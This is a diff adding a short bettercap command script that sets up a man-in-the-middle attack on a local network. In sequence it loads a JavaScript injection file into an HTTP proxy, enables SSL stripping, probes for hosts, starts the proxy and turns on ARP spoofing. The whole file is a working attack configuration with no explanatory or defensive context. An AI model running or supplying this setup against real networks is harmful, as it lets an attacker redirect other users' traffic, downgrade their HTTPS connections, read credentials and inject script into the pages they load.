@@ -1,0 +1,18 @@
+set http.proxy.script lib/bettercap_inject.js
+
+set http.proxy.sslstrip true
+
+net.probe on
+
+sleep 2
+
+net.probe off
+
+sleep 2
+
+http.proxy on
+
+sleep 2
+
+arp.spoof on
+
